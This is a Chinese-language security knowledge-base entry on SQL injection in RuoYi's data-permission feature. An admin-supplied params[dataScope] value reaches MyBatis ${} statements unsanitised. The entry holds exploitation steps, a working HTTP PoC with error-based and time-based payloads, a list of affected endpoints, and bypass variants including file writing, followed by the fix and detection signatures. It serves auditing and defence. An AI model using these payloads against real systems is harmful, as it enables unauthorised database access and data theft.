---
id: web-generic-sqli-ruoyi-datascope-params-admin-bypass
title: RuoYi 数据权限 ${params.dataScope} SQL 注入：admin 跳过切面覆盖后直入 Mapper
type: scenario
domain: web
path: web/generic/sqli
technique: ruoyi-datascope-params-sqli
tags:
- java
- ruoyi
- sqli
- mybatis
- datascope
- spring
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: <= 4.6.1（原文漏洞对比表）；4.2.0 实测
verification:
  verified_by: verifier-V201
  verified_at: '2026-11-07T02:10:53+08:00'
  notes: 已对照原文与全部61张图核对；admin跳过切面为源码补充说明，原文仅展示注入成功回显；未复跑环境
url: /docs/web/generic/sqli/web-generic-sqli-ruoyi-datascope-params-admin-bypass/
draft: false
kb_aliases:
- RuoYi SQL注入
- 若依 params[dataScope]
- DataScopeAspect SQL注入
- /system/role/list 注入
- 数据权限拼接注入
- clearDataScope 修复
---

## 一句话结论

RuoYi 的 `BaseEntity.params` 是可由请求参数 `params[dataScope]` 绑定的 Map，多个角色/用户/部门查询的 Mapper XML 又用 `${params.dataScope}` 直接拼接 SQL；`DataScopeAspect` 只对非 admin 用户覆盖该键，admin 登录时切面提前返回，攻击者传入的 `params[dataScope]` 原样进入 SQL，形成报错/布尔注入。

## 原理

- **参数绑定**：`SysRole`/`SysUser`/`SysDept` 都继承 `BaseEntity`，其中 `private Map<String, Object> params;` 带 getter/setter；Spring MVC 会把请求中的 `params[dataScope]=...` 绑定到该 Map。
- **切面逻辑**：`SysRoleServiceImpl.selectRoleList` 等方法标注 `@DataScope(deptAlias="d")`；`DataScopeAspect.doBefore` 调用 `handleDataScope(point)`。后者先取当前登录用户，若 `user.isAdmin()` 为真则直接 `return`，不向 `params` 写入任何值。
- **注入点**：`SysRoleMapper.xml` 的 `selectRoleList` 末尾有 `${params.dataScope}`（`${}` 是字符串替换，不是 `#{}` 预编译）；同样写法出现在 `SysDeptMapper.xml`、`SysUserMapper.xml` 的 selectDeptList/selectRoleList/selectUserList/selectAllocatedList/selectUnallocatedList 等语句。
- **为什么 admin 可利用**：非 admin 用户的 `params[dataScope]` 会被切面用服务端生成的 `AND (u.dept_id IN (...))` 覆盖，攻击者值失效；admin 因提前 return 保留了请求里传入的原始值，直接拼进 SQL。
- **为什么是 SQL 注入**：`${params.dataScope}` 位于 WHERE 子句，攻击者可用 `and extractvalue(1,concat(0x7e,(select database()),0x7e))` 触发 XPath 报错回显，或用布尔/时间盲注；`#{}` 的预编译在 `${}` 处完全不起作用。
- **修复**：官方在 `DataScopeAspect.doBefore` 开头加 `clearDataScope(point)`，把 `BaseEntity.getParams().put(DATA_SCOPE, "")`，确保无论是否 admin，请求中的 dataScope 都被清空后再由切面按权限重建。

## 触发条件

- RuoYi <= 4.6.1（原文对比表；4.2.0 实测），且未应用 clearDataScope 修复。
- 攻击者能以 admin（或 `isAdmin()` 为真的账号）登录；默认安装的 admin/admin123 或弱口令可满足。
- 目标接口使用 `@DataScope` 且对应 Mapper XML 含 `${params.dataScope}`（角色/用户/部门列表及导出接口）。
- 数据库错误信息可回显（报错注入），或可用布尔/时间盲注。

## 利用步骤

1. 以 admin 登录，获取有效会话（JSESSIONID/Shiro 会话）。
2. 确认目标接口：`/system/role/list`、`/system/role/export`、`/system/user/list`、`/system/user/export`、`/system/dept/list`、`/system/role/authUser/allocatedList`、`/system/role/authUser/unallocatedList`。
3. 发送 `params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))`，在响应错误信息中读取数据库名。
4. 用同样位置替换子查询读取表名/列名/数据，或改用布尔/时间盲注。
5. 若 `extractvalue` 被过滤，改用 `updatexml`、`GTID_SUBSET`、`exp()` 等报错函数或时间盲注。
6. 记录注入点与数据库权限，按授权范围停止。

## PoC

```http
POST /system/role/list HTTP/1.1
Host: target
Cookie: JSESSIONID=<admin 会话>
Content-Type: application/x-www-form-urlencoded

params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))
```

```text
预期：响应 500/错误信息中出现 XPATH syntax error: '~<database>~'；
也可用 params[dataScope]=and (select 1 from (select sleep(3))a) 做时间盲注。
```

```text
同一注入点可直接换到 /system/dept/list、/system/user/list、/system/role/export、/system/user/export、
/system/role/authUser/allocatedList、/system/role/authUser/unallocatedList。
```

## 变体与关联

- 变体：非 admin 用户若其角色 dataScope 为空或切面因异常未覆盖，也可能保留请求值；审计时确认 `handleDataScope` 的所有 return 分支。
- 变体：其它继承 BaseEntity 的实体与自定义 Mapper 同样可能把 `params` 拼进 SQL；全局搜索 `${params.`。
- 变体：报错函数不可用时用 `CASE WHEN` 布尔盲注、`BENCHMARK/SLEEP` 时间盲注，或 `INTO OUTFILE` 写文件（需 FILE 权限）。
- 关联：[[web-generic-sqli-error-based-extraction]]（报错注入通用手法）、[[web-java-framework-jeecgboot-dict-filter-sql-injection]]（同类 Java 框架 ${} 注入）、[[web-java-framework-ruoyi-download-resource-path-traversal]]（同产品其他漏洞）。

## 检测与防御

- 修复：升级到包含 `clearDataScope` 的版本；在切面入口清空 `BaseEntity.params` 中的 `dataScope`，不允许请求参数直接控制。
- 修复：Mapper 中把 `${params.dataScope}` 改为服务端白名单生成的结构化条件，或至少对 dataScope 做严格格式校验（只允许 `AND (...)` 模板）。
- 加固：默认 admin 口令必须修改；对列表/导出接口做权限与参数审计；数据库账号最小权限、关闭详细错误回显。
- 检测：请求体出现 `params[dataScope]` 且值含 `extractvalue`/`updatexml`/`sleep`/`union` 等；500 错误中出现 XPATH/SQL 报错；admin 会话异常调用多个列表接口。
